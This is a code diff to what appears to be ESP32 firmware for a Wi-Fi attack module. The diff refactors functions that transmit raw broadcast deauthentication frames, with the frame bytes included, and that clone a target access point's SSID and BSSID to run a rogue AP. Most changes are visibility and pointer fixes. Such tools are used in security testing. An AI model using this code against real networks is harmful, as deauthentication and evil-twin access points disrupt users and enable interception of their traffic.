@@ -9,10 +9,9 @@
 static TaskHandle_t task_brod_attack = NULL;
 static TaskHandle_t task_rogue_attack = NULL;
 
-wifi_config_t rouge_config;
+static wifi_config_t default_ap;
 
-bool running_broadcast_attack = false;
-int broadcast_attack_task_id = 0;
+static bool running_broadcast_attack = false;
 
 static const uint8_t deauth_frame_default[] = {
     0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff,
@@ -34,6 +33,21 @@ int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
   return 0;
 }
 
+/**
+ * @brief Start the broadcast attack
+ *
+ * @param ap_target target AP to attack
+ */
+static void wifi_attack_brod_send_deauth_frame(wifi_ap_record_t* ap_target);
+/**
+ * @brief Start the Rogue AP  attack
+ *
+ * @note BSSID is MAC address of APs Wi-Fi interface
+ *
+ * @param ap_record target AP that will be cloned/duplicated
+ */
+static void wifi_attack_rogueap(const wifi_ap_record_t* ap_record);
+
 static void attack_brodcast_send_raw_frame(const uint8_t* frame_buffer,
                                            int size) {
   esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
@@ -44,7 +58,7 @@ static void attack_brodcast_send_raw_frame(const uint8_t* frame_buffer,
   }
 }
 
-void wifi_attack_brod_send_deauth_frame(wifi_ap_record_t* ap_target) {
+static void wifi_attack_brod_send_deauth_frame(wifi_ap_record_t* ap_target) {
   ESP_LOGI(TAG_WIFI_ATTACK_MODULE, "Starting broadcast attack: %s",
            ap_target->ssid);
 
@@ -59,10 +73,10 @@ void wifi_attack_brod_send_deauth_frame(wifi_ap_record_t* ap_target) {
   vTaskSuspend(task_brod_attack);
 }
 
-void wifi_attack_rogueap(const wifi_ap_record_t* ap_record) {
+static void wifi_attack_rogueap(const wifi_ap_record_t* ap_record) {
   ESP_LOGI(TAG_WIFI_ATTACK_MODULE, "Configuring Rogue AP SSID: %s",
            ap_record->ssid);
-  wifi_driver_set_ap_mac(&ap_record->bssid);
+  wifi_driver_set_ap_mac(ap_record->bssid);
   wifi_config_t ap_config = {
       .ap = {.ssid_len = strlen((char*) ap_record->ssid),
              .channel = ap_record->primary,
@@ -85,7 +99,7 @@ void wifi_attacks_module_stop() {
     vTaskDelete(task_brod_attack);
   }
   if (task_rogue_attack != NULL) {
-    wifi_config_t default_ap = wifi_driver_access_point_begin();
+    default_ap = wifi_driver_access_point_begin();
     wifi_driver_restore_ap_mac();
   }
 }
@@ -119,4 +133,12 @@ void wifi_attack_handle_attacks(wifi_attacks_types_t attack_type,
     default:
       break;
   }
+}
+
+int wifi_attacks_get_attack_count() {
+  int count = 0;
+  while (WIFI_ATTACKS_LIST[count] != NULL) {
+    count++;
+  }
+  return count;
 }
